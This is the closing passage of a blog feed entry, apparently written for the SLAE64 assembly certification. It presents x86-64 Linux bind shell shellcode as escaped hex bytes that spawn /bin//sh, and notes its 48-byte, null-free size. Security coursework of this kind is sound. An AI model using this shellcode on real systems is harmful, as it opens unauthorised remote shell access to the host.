&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;50&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;50&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;5a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;5e&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;50&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;b9&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2f
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;62&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;69&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;6e&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;73&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;68&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;51
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;54&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;5f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;04&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;3b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;b0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;3c&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The final shellcode size is 48 bytes and null-free.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/slae64/image-20201025130613345.png&quot; alt=&quot;image-20201025130613345&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Whenever I could I skipped some steps to save some bytes, such as closing the original socked fd when a connection is received and setting the MAX client backlog.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert&lt;/a&gt; certification.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Student ID: SLAE64 - 1620&lt;/em&gt;&lt;/p&gt;</content><author><name>foo</name></author><category term="shellcode" /><summary type="html">A traditional bind shell is a type of shell in which the affected host opens up a communication port and waits for an incoming connection.</summary></entry></feed>